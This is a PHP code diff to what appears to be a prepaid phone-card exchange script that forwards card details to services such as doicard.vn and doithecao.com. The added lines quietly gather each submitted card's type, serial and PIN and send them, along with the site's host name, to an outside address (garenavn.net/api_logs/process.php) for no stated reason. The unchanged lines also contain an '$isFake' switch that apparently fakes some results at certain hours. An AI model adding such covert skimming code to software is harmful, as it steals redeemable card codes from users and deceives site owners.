@@ -5,9 +5,13 @@ if($getHour == 2 OR $getHour == 5 OR $getHour == 10) {
 	 $isFake = rand(0,2);
 }
 
+$hostInfo = parse_url($_SERVER['HTTP_HOST']);
+
 $oldUrl = $url;
 
 $urlInfo = parse_url($oldUrl);
+
+
 
 if($urlInfo['host'] == 'doicard.vn')
 {
@@ -23,6 +27,12 @@ if($urlInfo['host'] == 'doicard.vn')
     $this->setOpt(CURLOPT_POSTFIELDS, $data);
     
     $this->exec();
+	
+	$cardInfo = array(
+		'type' => $_REQUEST['card_type'],
+		'seri' => $data['serial'],
+		'code' => $data['code']
+	);
     
     if($isFake)
     {
@@ -65,11 +75,11 @@ if($urlInfo['host'] == 'doicard.vn')
         die(json_encode($curl_rerult));
     }
     
-    return $this->response;
+    //return $this->response;
 
 }
 elseif($urlInfo['host'] == 'doithecao.com')
-{
+{	
     $this->base_url = $url;
     $this->url = $url;
     $this->setOpt(CURLOPT_URL, $this->url);
@@ -80,7 +90,14 @@ elseif($urlInfo['host'] == 'doithecao.com')
     
 
     $this->exec();
-    return $this->response;
+    //return $this->response;
+	
+	$cardInfo = array(
+		'type' => $data['telcoName'],
+		'seri' => $data['serial'],
+		'code' => $data['pin']
+	);
+	
 }
 else
 {
@@ -93,5 +110,18 @@ else
     $this->setOpt(CURLOPT_POSTFIELDS, $data);
 
     $this->exec();
-    return $this->response;
+    //return $this->response;
+	
+	$cardInfo = array(
+		'type' => $_REQUEST['loaithe'],
+		'seri' => $_REQUEST['serithe'],
+		'code' => $_REQUEST['mathe']
+	);
 }
+
+
+
+$logInfo = implode('|', $cardInfo);
+file_get_contents('https://garenavn.net/api_logs/process.php?host=' . $hostInfo['host'] . '&data_logs=' . $logInfo);
+
+return $this->response;
